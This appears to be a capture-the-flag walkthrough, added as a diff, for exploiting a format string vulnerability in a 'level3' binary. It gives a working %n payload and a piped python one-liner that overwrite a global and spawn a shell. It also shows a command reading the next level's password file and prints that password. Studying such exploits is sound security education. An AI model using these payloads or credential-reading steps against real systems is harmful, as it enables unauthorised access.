@@ -1,0 +1,226 @@
+*** Level3 Walkthrough - Format String Vulnerability (Arbitrary Memory Write) ***
+** Overview  **
+
+The objective of this challenge is to obtain a shell by exploiting a format string vulnerability in the level3 executable.
+
+The binary passes user-controlled input directly to printf() without providing a format string. This allows an attacker to interpret input as format specifiers, enabling both memory disclosure and memory modification.
+
+The goal is to overwrite a global variable located at 0x0804988c with the value 64, causing the program to execute system("/bin/sh").
+
+** Reconnaissance **
+
+The first step is to understand how user input is processed.
+
+Examining the read-only data section reveals an interesting string:
+
+objdump -s -j .rodata ./level3
+
+Example output:
+
+Contents of section .rodata:
+ 80485f8 03000000 01000200 57616974 20776861  ........Wait wha
+ 8048608 743f210a 002f6269 6e2f7368 00        t?!../bin/sh.  
+
+The string:
+
+/bin/sh
+
+suggests that the binary contains functionality capable of spawning a shell.
+
+Next, inspect the disassembly:
+
+objdump -d ./level3
+
+Relevant instructions:
+
+080484a4 <v>:
+80484be: lea -0x208(%ebp),%eax
+80484c7: call fgets@plt
+
+80484d2: mov %eax,(%esp)
+80484d5: call printf@plt
+
+The program reads user input using fgets() and then passes the resulting buffer directly into printf().
+
+Instead of:
+
+printf("%s", buffer);
+
+the program effectively performs:
+
+printf(buffer);
+
+This immediately indicates a format string vulnerability.
+
+Further inspection reveals a comparison against a global variable:
+
+80484da: mov 0x804988c,%eax
+80484df: cmp $0x40,%eax
+80484e2: jne 8048518
+
+The objective therefore becomes changing:
+
+0x0804988c = 64 (0x40)
+
+
+** Vulnerability Analysis **
+
+Format string vulnerabilities occur when user input is interpreted as a format string.
+
+Common format specifiers include:
+
+Specifier	Function
+%x	Read stack values
+%s	Read memory contents
+%p	Display pointers
+%n	Write memory
+
+The %n specifier is particularly dangerous because it writes the number of printed characters to a supplied memory address.
+
+If an attacker can place an address on the stack and correctly position %n, arbitrary memory writes become possible.
+
+** Exploitation **
+* Identifying the Stack Offset *
+
+The first task is determining where user-controlled data appears in the argument list used by printf().
+
+Input:
+
+AAAA.%x.%x.%x.%x.%x
+
+Example output:
+
+AAAA.200.b7fd1ac0.b7ff37d0.41414141
+
+The value:
+
+41414141
+
+corresponds to the ASCII string:
+
+AAAA
+
+and appears as the fourth argument.
+
+Therefore the required argument offset is:
+
+4
+
+This means user-controlled data can be referenced using:
+
+%4$
+
+inside format strings.
+
+* Identifying the Target Address *
+
+The target variable can be identified from the disassembly:
+
+80484da: mov 0x804988c,%eax
+80484df: cmp $0x40,%eax
+
+Verification in gdb:
+
+x/wx 0x804988c
+
+Output:
+
+0x804988c <m>: 0x00000000
+
+Required values:
+
+Property        |	Value
+-----------------------------
+Variable        |	m
+Address         |	0x0804988c
+Required Value  |	64 (0x40)
+
+* Payload Construction *
+
+Because the executable uses the elf32-i386 architecture, the target address must be written in little-endian format.
+
+Address	    | Little-Endian
+------------------------------
+0x0804988c  |	\x8c\x98\x04\x08
+
+The target value is:
+
+64
+
+The address itself contributes four printed bytes:
+
+\x8c\x98\x04\x08
+
+Therefore:
+
+Desired Total = 64
+Already Printed = 4
+Remaining = 60
+
+Padding is added using:
+
+%60c
+
+The final payload becomes:
+
+\x8c\x98\x04\x08%60c%4$n
+
+Payload breakdown:
+
+Component        |	Purpose
+--------------------------------------------------------
+\x8c\x98\x04\x08 |	Address of variable m
+%60c             |	Pads output to 64 characters
+%4$n             |	Writes printed character count to m
+
+When %4$n executes:
+
+m = 64;
+
+* Exploitation *
+
+Execute the payload:
+
+(python -c 'print("\x8c\x98\x04\x08" + "%60c" + "%4$n")'; cat) | ./level3
+
+After execution:
+
+m = 64
+
+The comparison succeeds:
+
+if (m == 64)
+
+and execution reaches:
+
+system("/bin/sh");
+
+resulting in an interactive shell.
+
+** Password Retrieval **
+
+Once shell access has been obtained:
+
+cat /home/user/level4/.pass
+
+Output:
+
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+**Why the Exploit Works **
+
+The exploit succeeds because:
+
+- user-controlled input is passed directly to printf()
+- format specifiers are interpreted as instructions
+- %n allows memory modification
+- the target variable is stored at a known address
+- no validation or sanitization is performed
+
+By placing the address of m at the beginning of the payload, determining the correct stack offset, printing exactly 64 characters, and executing %4$n, the attacker forces:
+
+m = 64;
+
+The subsequent comparison evaluates to true and execution enters the privileged code path, spawning a shell.
+
+This challenge demonstrates how format string vulnerabilities can be used not only for information disclosure, but also for arbitrary memory modification and control-flow manipulation.
